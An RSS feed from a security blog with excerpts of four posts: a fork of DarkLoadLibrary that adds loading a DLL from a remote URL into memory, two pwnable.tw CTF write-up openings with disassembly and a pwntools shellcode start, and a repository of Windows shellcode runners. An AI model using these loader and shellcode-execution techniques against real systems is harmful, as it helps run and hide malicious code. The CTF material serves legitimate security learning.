<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Posts on b1n.io</title>
    <link>https://b1n.io/posts/</link>
    <description>Recent content in Posts on b1n.io</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Mon, 26 Dec 2022 01:24:06 -0500</lastBuildDate><atom:link href="https://b1n.io/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>SharkLoadLibrary</title>
      <link>https://b1n.io/posts/sharkloadlibrary/</link>
      <pubDate>Mon, 26 Dec 2022 01:24:06 -0500</pubDate>
      
      <guid>https://b1n.io/posts/sharkloadlibrary/</guid>
      <description>SharkLoadLibrary 是 DarkLoadLibrary 的完整版
在DarkLoadLibrary中的darkloadlibrary.h文件中, 作者定义了一组宏, 用于Control Flags
#define LOAD_LOCAL_FILE 0x00000001 #define LOAD_REMOTE_FILE 0x00000002 #define LOAD_MEMORY	0x00000003 #define NO_LINK	0x00010000 可以看到, 作者早就定义好了LOAD_REMOTE_FILE的宏, 只不过在公开项目时删除了相关功能
我将功能完善了, 开源在github供大家使用: SharkLoadLibrary
以下是项目介绍:
LoadLibrary for Children&amp;rsquo;s Paradise.
:sailboat: Folk From DarkLoadLibrary and thanks.
Feature New feature: LOAD_REMOTE_FILE
Usage PDARKMODULE DarkModule = DarkLoadLibrary( LOAD_REMOTE_FILE, // control flags &amp;#34;http://xxxx/demo.dll&amp;#34;, // remote dll url, if loading from remote NULL, // dll buffer to load from if loading from memory 0, // dll size if loading from memory L&amp;#34;Demo&amp;#34; // dll name if loaded from memory and remote ); Build &amp;amp;&amp;amp; Test Environmental requirements libcurl</description>
    </item>
    
    <item>
      <title>Pwnable.tw Orw</title>
      <link>https://b1n.io/posts/pwnable.tw-orw/</link>
      <pubDate>Sun, 25 Dec 2022 01:08:22 -0500</pubDate>
      
      <guid>https://b1n.io/posts/pwnable.tw-orw/</guid>
      <description>题目提示: Read the flag from /home/orw/flag.
Only open read write syscall are allowed to use.
checksec:
[*] &amp;#39;/home/kkkk/code/orw&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 看一下伪代码:
int __cdecl main(int argc, const char **argv, const char **envp) { orw_seccomp(); printf(&amp;#34;Give my your shellcode:&amp;#34;); read(0, &amp;amp;shellcode, 0xC8u); ((void (*)(void))shellcode)(); return 0; } 读取0xc8个字节, 然后转换为函数指针执行
这道题只需要构建一个open read write的shellcode就可以了
可以用pwntools自动完成
from pwn import * context(os=&amp;#34;linux&amp;#34;, arch=&amp;#34;i386&amp;#34;, log_level=&amp;#34;debug&amp;#34;) r = remote(&amp;#34;chall.</description>
    </item>
    
    <item>
      <title>Pwnable.tw Start</title>
      <link>https://b1n.io/posts/pwnable.tw-start/</link>
      <pubDate>Sat, 24 Dec 2022 04:37:02 -0500</pubDate>
      
      <guid>https://b1n.io/posts/pwnable.tw-start/</guid>
      <description>checksec:
[*] &amp;#39;/home/kkkk/code/start&amp;#39; Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) disassem:
Dump of assembler code for function _start: =&amp;gt; 0x08048060 &amp;lt;+0&amp;gt;:	push esp 0x08048061 &amp;lt;+1&amp;gt;:	push 0x804809d 0x08048066 &amp;lt;+6&amp;gt;:	xor eax,eax 0x08048068 &amp;lt;+8&amp;gt;:	xor ebx,ebx 0x0804806a &amp;lt;+10&amp;gt;:	xor ecx,ecx 0x0804806c &amp;lt;+12&amp;gt;:	xor edx,edx 0x0804806e &amp;lt;+14&amp;gt;:	push 0x3a465443 0x08048073 &amp;lt;+19&amp;gt;:	push 0x20656874 0x08048078 &amp;lt;+24&amp;gt;:	push 0x20747261 0x0804807d &amp;lt;+29&amp;gt;:	push 0x74732073 0x08048082 &amp;lt;+34&amp;gt;:	push 0x2774654c 0x08048087 &amp;lt;+39&amp;gt;:	mov ecx,esp 0x08048089 &amp;lt;+41&amp;gt;:	mov dl,0x14 0x0804808b &amp;lt;+43&amp;gt;:	mov bl,0x1 0x0804808d &amp;lt;+45&amp;gt;:	mov al,0x4 0x0804808f &amp;lt;+47&amp;gt;:	int 0x80 0x08048091 &amp;lt;+49&amp;gt;:	xor ebx,ebx 0x08048093 &amp;lt;+51&amp;gt;:	mov dl,0x3c 0x08048095 &amp;lt;+53&amp;gt;:	mov al,0x3 0x08048097 &amp;lt;+55&amp;gt;:	int 0x80 0x08048099 &amp;lt;+57&amp;gt;:	add esp,0x14 0x0804809c &amp;lt;+60&amp;gt;:	ret End of assembler dump.</description>
    </item>
    
    <item>
      <title>Cpp Shellcode</title>
      <link>https://b1n.io/posts/cpp-shellcode/</link>
      <pubDate>Sat, 24 Dec 2022 01:32:07 -0500</pubDate>
      
      <guid>https://b1n.io/posts/cpp-shellcode/</guid>
      <description>I made a repository of Windows Shellcode runners: cpp-shellcode.
Here are some introductions:
cpp-shellcode is A repository of Windows Shellcode runners. The applications load and execute Shellcode using various API calls or techniques.
❤️ THANKS @go-shellcode
The available Shellcode runners include:
CreateFiber CreateRemoteThread CreateThread EtwpCreateEtwThread NtQueueApcThreadEx-Local CreateFiber This application leverages the Windows CreateFiber function from the Kernel32.dll to execute shellcode within this application&amp;rsquo;s process. This is usefull when you want to avoid remote process injection and want to avoid calling CreateThread.</description>
    </item>
    
  </channel>
</rss>
